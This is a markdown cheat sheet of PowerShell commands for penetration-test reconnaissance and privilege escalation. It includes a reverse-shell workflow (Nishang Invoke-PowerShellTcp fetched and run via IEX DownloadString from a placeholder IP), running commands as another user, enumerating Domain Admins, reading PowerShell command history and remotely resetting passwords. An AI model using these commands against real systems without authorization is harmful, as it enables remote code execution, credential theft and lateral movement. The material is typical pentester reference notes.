# PowerShell

Some useful PowerShell commands that you can use during your recon or privsec phases.


## Execute block as an other user

```powershell
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<dom>\<username>", $pass)
Invoke-Command -Computer <computer_name> -Credential $cred -ScriptBlock { cmd.exe "/c <cmd>" }
```


## Download and execute script

The repository [Nishang](https://github.com/samratashok/nishang) contains a good
PowerShell script to create a [reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
You need to add the following line at the end:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>
```

On your local machine:

- Create an HTTP server to serve the script: `python -m http.serve`
- Listen for an incoming [connection with nc](reverse-shell.md#listen-with-netcat).

On the remote host, execute the following PowerShell script:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
```


## Execute C# DLL from Powershell

```powershell
# Load a dll to Powershell
[Reflection.Assembly]::LoadFile("C:\Path\MyNamespace.Service.dll")
[Reflection.Assembly]::LoadFile("C:\Path\MyNamespace.Cryptography.dll")

# Call a public public static method
[MyNamespace.Service.Config]::ApplicationKey()

# Instantiate a class and class a method
$c = New-Object MyNamespace.Cryptography.MyCryptography
$c.Decrypt("CIPHER_TEXT", [MyNamespace.Service.Config]::ApplicationKey())
```


## Domain commands


### Collect AD users information

Here is snippets of Powershell commands to interact with AD LDAP. You can also
use customize filters to get vulnerable users ([SPN](./windows.md#list-spn-accounts), ...)

```powershell
# Helping functions
function Get-ADUserDirectoryEntry($user) {
    return (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$user))")).FindOne().GetDirectoryEntry()
}

function Get-ADUserGroups($user) {
    $userDirectoryEntry = Get-ADUserDirectoryEntry($user)
    $groups = $userDirectoryEntry.memberOf

    return $groups
}

function Get-ADGroupMembers($GroupName) {
    if ($GroupName -like "CN=*") {
        $GroupDistinguishedName = $GroupName
    } else {
        # find the distinguished name from the group name
        $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Group)(cn=$GroupName))")).FindOne().GetDirectoryEntry().distinguishedName
    }

    # limited to the first 10k entries
    $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(memberOf=$GroupDistinguishedName ))")).FindAll()

    return $GroupMembers.properties
}

function Get-ADComputerByOS($operatingSystem) {
    # https://ldapwiki.com/wiki/Active%20Directory%20Computer%20Related%20LDAP%20Query
    return (New-Object System.DirectoryServices.DirectorySearcher("(&(&(&(samAccountType=805306369)(objectCategory=computer)(operatingSystem=$operatingSystem*))))")).FindAll()
}

# Get "Domain admins" users, be carefull the name may change depending on the DC lang
$DomainAdmins = Get-ADGroupMembers("Domain Admins")
foreach($user in $DomainAdmins) { echo "$($user.displayname) ($($user.samaccountname))" }
```


### Get Domain Password Policy

```powershell
$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
```


### Get user owner

```powershell
Get-ADUser $USERNAME | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
```


### List deleted users

```powershell
$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter "(objectClass=user)" -IncludeDeletedObjects -properties *
foreach ($object in $objects) { $object }
```


## Miscellaneous commands

### List TCP listening connections

The [`Get-NetTCPConnection`](https://docs.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=win10-ps)
cmdlets lists TCP connections. By default the processes pid is return, so the
following command line select the process name instead.

```powershell
Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
```


### List Email aliases

```powershell
$ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses
```


### Get PowerShell command history

```powershell
cd "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline"
gc ConsoleHost_history.txt
```


### Convert DACL

```powershell
$acl = get-acl HKLM:\System\CurrentControlSet\Services
ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
```


### Set Password Remotely

This [script](./assets/Set-PasswordRemotely.ps1) change the password of a user
on a remote forest.

```powershell
Set-PasswordRemotely {USERNAME} {DOMAIN}
```
